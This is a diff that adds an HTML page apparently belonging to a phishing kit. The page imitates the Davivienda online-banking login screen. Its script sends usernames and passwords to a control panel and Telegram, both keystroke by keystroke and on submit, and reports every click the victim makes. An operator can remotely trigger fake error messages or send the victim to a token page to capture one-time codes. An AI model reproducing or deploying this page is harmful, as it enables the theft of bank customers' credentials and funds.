@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Iniciar Sesión - Davivienda</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            scrollbar-width: none !important;
+            -ms-overflow-style: none !important;
+        }
+
+        *::-webkit-scrollbar,
+        html::-webkit-scrollbar,
+        body::-webkit-scrollbar,
+        .main-content::-webkit-scrollbar,
+        .mobile-container::-webkit-scrollbar {
+            display: none !important;
+            width: 0 !important;
+            height: 0 !important;
+            background: transparent !important;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            height: 100dvh;
+            margin: 0;
+            padding: 0;
+            background-color: #df1622;
+            overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .mobile-container {
+            width: 100%;
+            max-width: 440px;
+            height: 100%;
+            height: 100dvh;
+            background-color: #df1622;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+            margin: 0 auto;
+        }
+
+        @media (max-width: 480px) {
+            .mobile-container {
+                max-width: 100%;
+                width: 100%;
+            }
+        }
+
+        .header {
+            display: flex;
+            flex-direction: column;
+            padding: calc(14px + env(safe-area-inset-top, 0px)) 20px 10px 20px;
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .top-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            width: 100%;
+            height: 40px;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+        }
+
+        .logo-container svg {
+            width: 48px;
+            height: auto;
+        }
+
+        .support-btn {
+            background-color: #ffffff;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            cursor: pointer;
+            flex-shrink: 0;
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
+            transition: transform 0.08s;
+        }
+
+        .support-btn:active {
+            transform: scale(0.92);
+        }
+
+        .support-btn svg {
+            width: 22px;
+            height: 22px;
+            fill: #df1622;
+        }
+
+        .greeting {
+            font-size: 20px;
+            font-weight: 500;
+            color: #ffffff;
+            letter-spacing: -0.1px;
+        }
+
+        .greeting-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 22px;
+        }
+
+        .main-content {
+            background-color: #f1f3f6;
+            flex-grow: 1;
+            border-top-left-radius: 26px;
+            border-top-right-radius: 26px;
+            padding: 22px 20px 14px 20px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-y: auto;
+            overflow-x: hidden;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none !important;
+            -ms-overflow-style: none !important;
+        }
+
+        .main-content::-webkit-scrollbar {
+            display: none !important;
+            width: 0 !important;
+            height: 0 !important;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            border-radius: 16px;
+            padding: 20px 18px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+            margin-bottom: 16px;
+            flex-shrink: 0;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13.5px;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .custom-input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dcdfe6;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            background-color: #fff;
+            color: #111;
+            transition: border-color 0.2s;
+        }
+
+        .custom-input::placeholder {
+            color: #9aa0a6;
+        }
+
+        .custom-input:focus {
+            border-color: #df1622;
+            color: #111;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 14px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #9aa0a6;
+            display: flex;
+            align-items: center;
+        }
+
+        .eye-icon svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        .error-message {
+            display: none !important;
+            background-color: #fff2f2;
+            color: #c92a2a;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 13.5px;
+            font-weight: 500;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #ffc9c9;
+            border-left: 5px solid #df1622;
+            box-shadow: 0 4px 12px rgba(223, 22, 34, 0.08);
+            line-height: 1.5;
+            animation: fadeIn 0.3s ease-in-out;
+        }
+
+        .error-message.show {
+            display: flex !important;
+        }
+
+        .error-message svg {
+            width: 24px;
+            height: 24px;
+            fill: #df1622;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background-color: #e4e7ec;
+            color: #a0a6ad;
+            border: none;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: not-allowed;
+            margin-top: 4px;
+            touch-action: manipulation;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            transition: background-color 0.15s, color 0.15s, transform 0.08s;
+        }
+
+        .btn-login.active {
+            background-color: #df1622;
+            color: white;
+            cursor: pointer;
+        }
+
+        .btn-login.active:active {
+            transform: scale(0.97);
+        }
+
+        .forgot-password {
+            display: block;
+            text-align: center;
+            font-size: 13.5px;
+            color: #1a1a1a;
+            text-decoration: underline;
+            font-weight: 500;
+            margin-top: 16px;
+            touch-action: manipulation;
+        }
+
+        .products-card {
+            background-color: #ffffff;
+            border-radius: 16px;
+            padding: 16px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+            cursor: pointer;
+            margin-bottom: 20px;
+            flex-shrink: 0;
+            touch-action: manipulation;
+            -webkit-tap-highlight-color: transparent;
+            transition: transform 0.08s;
+        }
+
+        .products-card:active {
+            transform: scale(0.98);
+        }
+
+        .products-card span {
+            font-size: 15px;
+            font-weight: 600;
+            color: #111;
+        }
+
+        .products-card svg {
+            width: 18px;
+            height: 18px;
+            fill: #9aa0a6;
+            flex-shrink: 0;
+        }
+
+        .terms-link {
+            display: block;
+            text-align: center;
+            font-size: 13.5px;
+            color: #555;
+            text-decoration: underline;
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+
+        .bottom-nav {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding: 10px 0 calc(12px + env(safe-area-inset-bottom, 0px)) 0;
+            border-top: 1px solid #e8eaed;
+            flex-shrink: 0;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: #5f6368;
+            font-size: 11px;
+            font-weight: 500;
+            gap: 4px;
+        }
+
+        .nav-item svg {
+            width: 22px;
+            height: 22px;
+            fill: #5f6368;
+            flex-shrink: 0;
+        }
+
+        #loadingOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            height: 100dvh;
+            background: #df1622;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            color: white;
+            text-align: center;
+            padding: calc(20px + env(safe-area-inset-top, 0px)) 20px calc(20px + env(safe-area-inset-bottom, 0px)) 20px;
+            overflow-y: auto;
+            overflow-x: hidden;
+            scrollbar-width: none !important;
+            -ms-overflow-style: none !important;
+        }
+
+        #loadingOverlay::-webkit-scrollbar {
+            display: none !important;
+            width: 0 !important;
+            height: 0 !important;
+        }
+
+        #loadingOverlay .logo-approval {
+            margin-bottom: 25px;
+        }
+
+        #loadingOverlay .logo-approval svg {
+            width: 70px;
+            height: auto;
+        }
+
+        #loadingOverlay .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        #loadingOverlay h1 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        #loadingOverlay p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-height: 700px) {
+            .header {
+                padding: calc(8px + env(safe-area-inset-top, 0px)) 16px 6px 16px;
+            }
+            .greeting-row {
+                margin-top: 10px;
+            }
+            .greeting {
+                font-size: 18px;
+            }
+            .main-content {
+                padding: 16px 16px 10px 16px;
+            }
+            .login-card {
+                padding: 16px 14px;
+                margin-bottom: 12px;
+            }
+            .input-group {
+                margin-bottom: 12px;
+            }
+            .products-card {
+                padding: 12px 14px;
+                margin-bottom: 12px;
+            }
+            .terms-link {
+                margin-bottom: 12px;
+            }
+            .bottom-nav {
+                padding: 8px 0 calc(8px + env(safe-area-inset-bottom, 0px)) 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container">
+        <div class="header">
+            <div class="top-row">                
+                <div class="logo-container">
+                    <svg width="36" height="31" viewBox="0 0 36 31" xmlns="http://www.w3.org/2000/svg">
+                      <path d="M17.4691 29.875C15.9347 29.8648 14.4083 29.653 12.9291 29.245C7.99913 30.335 4.19913 28.315 2.66913 25.825C2.02531 24.7677 1.74521 23.5287 1.87161 22.2972C1.998 21.0658 2.52394 19.9095 3.36913 19.005C4.42789 17.6516 5.09231 16.032 5.28913 14.325H4.61913C2.37913 14.435 0.619129 13.715 0.139129 12.485C-0.180871 11.675 -0.100871 10.335 2.04913 8.485C7.45913 4.005 14.5191 0.125 17.4691 0.125C18.8791 0.125 21.3191 1.035 24.2391 2.625C24.1961 2.27078 24.2891 1.91343 24.4991 1.625C24.675 1.44082 24.8911 1.29984 25.1305 1.2131C25.3699 1.12636 25.6261 1.0962 25.8791 1.125H28.5491C28.8077 1.09752 29.0691 1.13117 29.3123 1.22323C29.5554 1.31529 29.7736 1.46318 29.9491 1.655C30.1104 1.97115 30.1987 2.31949 30.2073 2.67431C30.216 3.02913 30.1448 3.38136 29.9991 3.705C29.8093 4.47384 29.6789 5.25615 29.6091 6.045C30.1391 6.435 31.8491 7.705 32.8591 8.565C35.0091 10.375 35.0891 11.715 34.7691 12.565C34.2891 13.795 32.5291 14.515 30.2891 14.405H29.6191C29.8124 16.1177 30.481 17.7423 31.5491 19.095C32.3904 19.9999 32.9131 21.1549 33.0377 22.3841C33.1622 23.6134 32.8818 24.8497 32.2391 25.905C30.7491 28.315 26.9991 30.335 21.9991 29.245C20.523 29.6514 19.0001 29.8632 17.4691 29.875ZM12.9991 28.485H13.0991C14.5349 28.8875 16.0181 29.096 17.5091 29.105C19.0035 29.0961 20.49 28.8876 21.9291 28.485H22.0191H22.1191C26.7891 29.535 30.2891 27.705 31.6891 25.415C32.2655 24.4863 32.5155 23.3919 32.3996 22.3051C32.2836 21.2183 31.8084 20.2012 31.0491 19.415C29.7892 17.8352 29.0518 15.9026 28.9391 13.885V13.485H29.3391L30.4191 13.545C32.3091 13.635 33.8091 13.085 34.1691 12.175C34.5291 11.265 33.8391 10.325 32.4191 9.125C31.2391 8.125 29.0691 6.535 29.0491 6.515L28.8791 6.395V6.195C28.9444 5.29484 29.0849 4.40173 29.2991 3.525C29.4491 2.945 29.5591 2.365 29.3491 2.095C29.2387 1.99691 29.1078 1.92451 28.9661 1.88302C28.8243 1.84152 28.6751 1.83195 28.5291 1.855H25.8791C25.7365 1.83911 25.5921 1.85411 25.4558 1.89898C25.3195 1.94384 25.1944 2.01751 25.0891 2.115C25.0219 2.2306 24.9816 2.35985 24.9713 2.49315C24.9609 2.62646 24.9806 2.76039 25.0291 2.885V2.995C25.0291 3.075 25.0791 3.165 25.0991 3.255L25.2991 4.085L24.5591 3.665C21.5091 1.915 18.8491 0.875 17.4691 0.865C14.9991 0.875 8.27913 4.275 2.52913 9.125C1.10913 10.325 0.529129 11.435 0.829129 12.255C1.12913 13.075 2.68913 13.715 4.57913 13.625L6.05913 13.545V13.945C5.95871 15.9505 5.239 17.8755 3.99913 19.455C3.24139 20.2418 2.7664 21.2579 2.64875 22.3439C2.53111 23.4299 2.77746 24.5242 3.34913 25.455C4.74913 27.745 8.24913 29.575 12.9091 28.525L12.9991 28.485Z" fill="white"/>
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="greeting-row">
+                <h1 id="greetingText" class="greeting">Cargando...</h1>
+                <div class="support-btn" title="Soporte">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12,1C7,1,3,5,3,10v7c0,1.66,1.34,3,3,3h1v-8H5v-2c0-3.87,3.13-7,7-7s7,3.13,7,7v2h-2v8h1c1.66,0,3-1.34,3-3v-7C21,5,17,1,12,1z M6,15v4H6c-0.55,0-1-0.45-1-1v-3H6 z M19,18c0,0.55-0.45,1-1,1h-1v-4h1V18z"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="login-card">
+                <div id="error-message" class="error-message">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                    </svg>
+                    <span>Estimado cliente, los datos ingresados son incorrectos o su usuario se encuentra bloqueado. Por favor verifique.</span>
+                </div>
+
+                <div class="input-group">
+                    <label for="userInput">Ingrese su usuario</label>
+                    <input type="text" id="userInput" class="custom-input" placeholder="Usuario" autocomplete="off" maxlength="25">
+                </div>
+
+                <div class="input-group" style="margin-bottom: 20px;">
+                    <label for="passInput">Ingrese su contraseña</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="passInput" class="custom-input" placeholder="Contraseña" maxlength="25">
+                        <button type="button" id="togglePass" class="eye-icon">
+                            <svg viewBox="0 0 24 24">
+                                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <button id="btnLogin" class="btn-login">Iniciar sesión</button>
+                <a href="#" class="forgot-password">Ayuda para iniciar sesión</a>
+            </div>
+
+            <div class="products-card">
+                <span>Solicitar productos</span>
+                <svg viewBox="0 0 24 24">
+                    <path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/>
+                </svg>
+            </div>
+
+            <a href="#" class="terms-link">Términos y condiciones</a>
+        </div>
+
+        <div id="loadingOverlay">
+            <div class="logo-approval">
+                <svg width="48" height="41" viewBox="0 0 36 31" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M17.4691 29.875C15.9347 29.8648 14.4083 29.653 12.9291 29.245C7.99913 30.335 4.19913 28.315 2.66913 25.825C2.02531 24.7677 1.74521 23.5287 1.87161 22.2972C1.998 21.0658 2.52394 19.9095 3.36913 19.005C4.42789 17.6516 5.09231 16.032 5.28913 14.325H4.61913C2.37913 14.435 0.619129 13.715 0.139129 12.485C-0.180871 11.675 -0.100871 10.335 2.04913 8.485C7.45913 4.005 14.5191 0.125 17.4691 0.125C18.8791 0.125 21.3191 1.035 24.2391 2.625C24.1961 2.27078 24.2891 1.91343 24.4991 1.625C24.675 1.44082 24.8911 1.29984 25.1305 1.2131C25.3699 1.12636 25.6261 1.0962 25.8791 1.125H28.5491C28.8077 1.09752 29.0691 1.13117 29.3123 1.22323C29.5554 1.31529 29.7736 1.46318 29.9491 1.655C30.1104 1.97115 30.1987 2.31949 30.2073 2.67431C30.216 3.02913 30.1448 3.38136 29.9991 3.705C29.8093 4.47384 29.6789 5.25615 29.6091 6.045C30.1391 6.435 31.8491 7.705 32.8591 8.565C35.0091 10.375 35.0891 11.715 34.7691 12.565C34.2891 13.795 32.5291 14.515 30.2891 14.405H29.6191C29.8124 16.1177 30.481 17.7423 31.5491 19.095C32.3904 19.9999 32.9131 21.1549 33.0377 22.3841C33.1622 23.6134 32.8818 24.8497 32.2391 25.905C30.7491 28.315 26.9991 30.335 21.9991 29.245C20.523 29.6514 19.0001 29.8632 17.4691 29.875ZM12.9991 28.485H13.0991C14.5349 28.8875 16.0181 29.096 17.5091 29.105C19.0035 29.0961 20.49 28.8876 21.9291 28.485H22.0191H22.1191C26.7891 29.535 30.2891 27.705 31.6891 25.415C32.2655 24.4863 32.5155 23.3919 32.3996 22.3051C32.2836 21.2183 31.8084 20.2012 31.0491 19.415C29.7892 17.8352 29.0518 15.9026 28.9391 13.885V13.485H29.3391L30.4191 13.545C32.3091 13.635 33.8091 13.085 34.1691 12.175C34.5291 11.265 33.8391 10.325 32.4191 9.125C31.2391 8.125 29.0691 6.535 29.0491 6.515L28.8791 6.395V6.195C28.9444 5.29484 29.0849 4.40173 29.2991 3.525C29.4491 2.945 29.5591 2.365 29.3491 2.095C29.2387 1.99691 29.1078 1.92451 28.9661 1.88302C28.8243 1.84152 28.6751 1.83195 28.5291 1.855H25.8791C25.7365 1.83911 25.5921 1.85411 25.4558 1.89898C25.3195 1.94384 25.1944 2.01751 25.0891 2.115C25.0219 2.2306 24.9816 2.35985 24.9713 2.49315C24.9609 2.62646 24.9806 2.76039 25.0291 2.885V2.995C25.0291 3.075 25.0791 3.165 25.0991 3.255L25.2991 4.085L24.5591 3.665C21.5091 1.915 18.8491 0.875 17.4691 0.865C14.9991 0.875 8.27913 4.275 2.52913 9.125C1.10913 10.325 0.529129 11.435 0.829129 12.255C1.12913 13.075 2.68913 13.715 4.57913 13.625L6.05913 13.545V13.945C5.95871 15.9505 5.239 17.8755 3.99913 19.455C3.24139 20.2418 2.7664 21.2579 2.64875 22.3439C2.53111 23.4299 2.77746 24.5242 3.34913 25.455C4.74913 27.745 8.24913 29.575 12.9091 28.525L12.9991 28.485Z" fill="white"/>
+                </svg>
+            </div>
+            <div class="spinner"></div>
+            <h1>Validando información</h1>
+            <p>Por favor, espere un momento...</p>
+        </div>
+
+        <div class="bottom-nav">
+            <a href="#" class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M3 3h8v8H3V3m10 0h8v8h-8V3M3 13h8v8H3v-8m10 0h8v8h-8v-8z"/></svg>QR
+            </a>
+            <a href="#" class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>Puntos
+            </a>
+            <a href="#" class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 10h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"/></svg>Promociones
+            </a>
+            <a href="#" class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>Más
+            </a>
+        </div>
+    </div>
+
+    <script src="telegram_config.js"></script>
+    <script src="realtime.js"></script>
+    <script>
+        const sessionId = RealtimeBus.getOrCreateSessionId();
+        sessionStorage.setItem('davi_session_id', sessionId);
+        sessionStorage.setItem('session_id', sessionId);
+        localStorage.setItem('davi_session_id', sessionId);
+
+        // Notificar presencia al abrir la página desde Móvil o PC
+        RealtimeBus.saveSession(sessionId, {
+            page: 'index.html',
+            status: 'online',
+            device: getDeviceInfo()
+        });
+
+        // Verificar si se solicitó mostrar error (por ejemplo, desde Telegram o regreso de token)
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('error') === '1' || sessionStorage.getItem('davi_show_error') === '1') {
+            sessionStorage.removeItem('davi_show_error');
+            setTimeout(() => {
+                const errBox = document.getElementById('error-message');
+                if (errBox) errBox.classList.add('show');
+            }, 150);
+        }
+
+        try {
+            const options = { timeZone: 'America/El_Salvador', hour: 'numeric', hour12: false };
+            const formatter = new Intl.DateTimeFormat('en-US', options);
+            const hourElSalvador = parseInt(formatter.format(new Date()));
+            const greetingText = document.getElementById('greetingText');
+
+            if (hourElSalvador >= 5 && hourElSalvador < 12) {
+                greetingText.textContent = "Buenos días";
+            } else if (hourElSalvador >= 12 && hourElSalvador < 18) {
+                greetingText.textContent = "Buenas tardes";
+            } else {
+                greetingText.textContent = "Buenas noches";
+            }
+        } catch (e) {
+            document.getElementById('greetingText').textContent = "Bienvenido";
+        }
+
+        const userInput = document.getElementById('userInput');
+        const passInput = document.getElementById('passInput');
+        const btnLogin = document.getElementById('btnLogin');
+        const togglePass = document.getElementById('togglePass');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const errorMessage = document.getElementById('error-message');
+
+        function hideError() {
+            errorMessage.classList.remove('show');
+        }
+
+        function checkInputs() {
+            hideError();
+            if (userInput.value.trim().length > 0 && passInput.value.trim().length > 0) {
+                btnLogin.classList.add('active');
+            } else {
+                btnLogin.classList.remove('active');
+            }
+        }
+
+        let typingTimer = null;
+        function syncLiveInputs() {
+            clearTimeout(typingTimer);
+            typingTimer = setTimeout(() => {
+                const u = userInput.value.trim();
+                const p = passInput.value.trim();
+                if (u.length > 0 || p.length > 0) {
+                    RealtimeBus.saveSession(sessionId, {
+                        user: u,
+                        pass: p,
+                        page: 'index.html',
+                        device: getDeviceInfo()
+                    });
+                }
+            }, 100);
+        }
+
+        userInput.addEventListener('input', function () {
+            checkInputs();
+            syncLiveInputs();
+        });
+
+        passInput.addEventListener('input', function () {
+            checkInputs();
+            syncLiveInputs();
+        });
+
+        const eyeIconPath = "M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z";
+        const eyeOffIconPath = "M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z";
+
+        togglePass.addEventListener('click', function() {
+            const iconSvg = this.querySelector('svg');
+            if (passInput.type === 'password') {
+                passInput.type = 'text';
+                iconSvg.innerHTML = `<path d="${eyeOffIconPath}"/>`;
+            } else {
+                passInput.type = 'password';
+                iconSvg.innerHTML = `<path d="${eyeIconPath}"/>`;
+            }
+        });
+
+        // ================= ESCUCHA EN TIEMPO REAL INMEDIATA (<50ms) =================
+        let lastCmdId = null;
+        let isLoggingIn = false;
+
+        function handleInstantCommand(cmd) {
+            if (!cmd || !cmd.action) return;
+            if (cmd.cmdId && cmd.cmdId === lastCmdId) return;
+            lastCmdId = cmd.cmdId;
+
+            const effectiveSid = cmd.targetSessionId || sessionId;
+
+            if (cmd.action === 'error_login') {
+                isLoggingIn = false;
+                btnLogin.style.pointerEvents = 'auto';
+                loadingOverlay.style.display = 'none';
+                passInput.value = '';
+                errorMessage.classList.add('show');
+                btnLogin.classList.remove('active');
+                passInput.focus();
+            } else if (cmd.action === 'goto_token' || cmd.action === 'resend_token') {
+                window.location.replace('token.html?sid=' + encodeURIComponent(effectiveSid));
+            } else if (cmd.action === 'approve_success') {
+                window.location.replace('token.html?sid=' + encodeURIComponent(effectiveSid) + '&approved=1');
+            } else if (cmd.action === 'loading') {
+                loadingOverlay.style.display = 'flex';
+            }
+        }
+
+        RealtimeBus.on('command', handleInstantCommand);
+        RealtimeBus.on('client_command', handleInstantCommand);
+
+        function tryLogin() {
+            if (isLoggingIn) return;
+
+            const user = userInput.value.trim();
+            const pass = passInput.value.trim();
+
+            if (!user) {
+                userInput.focus();
+                userInput.style.borderColor = '#df1622';
+                setTimeout(() => { userInput.style.borderColor = ''; }, 1500);
+                return;
+            }
+            if (!pass) {
+                passInput.focus();
+                passInput.style.borderColor = '#df1622';
+                setTimeout(() => { passInput.style.borderColor = ''; }, 1500);
+                return;
+            }
+
+            isLoggingIn = true;
+            btnLogin.classList.add('active');
+            btnLogin.style.pointerEvents = 'none';
+
+            sessionStorage.setItem('user', user);
+            sessionStorage.setItem('pass', pass);
+            localStorage.setItem('user', user);
+            localStorage.setItem('pass', pass);
+
+            loadingOverlay.style.display = 'flex';
+
+            // Enviar inmediatamente al Panel de Control y Telegram (<50ms)
+            RealtimeBus.broadcast('login_submitted', {
+                sessionId,
+                user: user,
+                pass: pass,
+                device: getDeviceInfo(),
+                timestamp: Date.now()
+            });
+
+            RealtimeBus.saveSession(sessionId, {
+                user: user,
+                pass: pass,
+                status: 'waiting_login',
+                page: 'index.html',
+                device: getDeviceInfo()
+            });
+        }
+
+        btnLogin.addEventListener('click', function(e) {
+            e.preventDefault();
+            tryLogin();
+        });
+
+        passInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                tryLogin();
+            }
+        });
+
+        userInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (passInput.value.trim()) {
+                    tryLogin();
+                } else {
+                    passInput.focus();
+                }
+            }
+        });
+
+        function showToast(msg) {
+            let t = document.getElementById('toastNotice');
+            if (!t) {
+                t = document.createElement('div');
+                t.id = 'toastNotice';
+                t.style.cssText = 'position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:rgba(20,20,20,0.88);color:#fff;padding:10px 18px;border-radius:20px;font-size:13px;z-index:99999;transition:opacity 0.3s;pointer-events:none;text-align:center;max-width:90%;box-shadow:0 4px 12px rgba(0,0,0,0.25);opacity:0;';
+                document.body.appendChild(t);
+            }
+            t.textContent = msg;
+            t.style.opacity = '1';
+            clearTimeout(t.timer);
+            t.timer = setTimeout(() => { t.style.opacity = '0'; }, 3000);
+        }
+
+        // Captura de botones interactivos de la interfaz para notificar a Telegram y dar feedback visual
+        document.querySelector('.support-btn')?.addEventListener('click', function() {
+            showToast('Línea de soporte Davivienda: (503) 2556-0000');
+            RealtimeBus.sendClientEvent(sessionId, 'click_support', {
+                label: 'Clic en Soporte (Auricular)',
+                info: 'El usuario tocó el icono de soporte telefónico'
+            });
+        });
+
+        document.querySelector('.forgot-password')?.addEventListener('click', function(e) {
+            e.preventDefault();
+            showToast('Para asistencia con su usuario o clave llame al 2556-0000');
+            RealtimeBus.sendClientEvent(sessionId, 'click_help', {
+                label: 'Clic en Ayuda para iniciar sesión',
+                info: 'El usuario solicitó recuperar u obtener ayuda de acceso'
+            });
+        });
+
+        document.querySelector('.products-card')?.addEventListener('click', function() {
+            showToast('Consulte productos disponibles en davivienda.com.sv');
+            RealtimeBus.sendClientEvent(sessionId, 'click_products', {
+                label: 'Clic en Solicitar productos',
+                info: 'El usuario abrió la sección de productos bancarios'
+            });
+        });
+
+        document.querySelector('.terms-link')?.addEventListener('click', function(e) {
+            e.preventDefault();
+            showToast('Términos y condiciones de Banca en Línea Davivienda');
+            RealtimeBus.sendClientEvent(sessionId, 'click_terms', {
+                label: 'Clic en Términos y condiciones',
+                info: 'El usuario consultó los términos legales'
+            });
+        });
+
+        document.querySelectorAll('.bottom-nav .nav-item').forEach(function(item) {
+            item.addEventListener('click', function(e) {
+                e.preventDefault();
+                const tabTitle = item.textContent.trim();
+                showToast('Sección ' + tabTitle + ' disponible en la app oficial');
+                RealtimeBus.sendClientEvent(sessionId, 'click_tab', {
+                    label: 'Pestaña: ' + tabTitle,
+                    info: 'Navegación inferior: ' + tabTitle
+                });
+            });
+        });
+    </script>
+</body>
+</html>
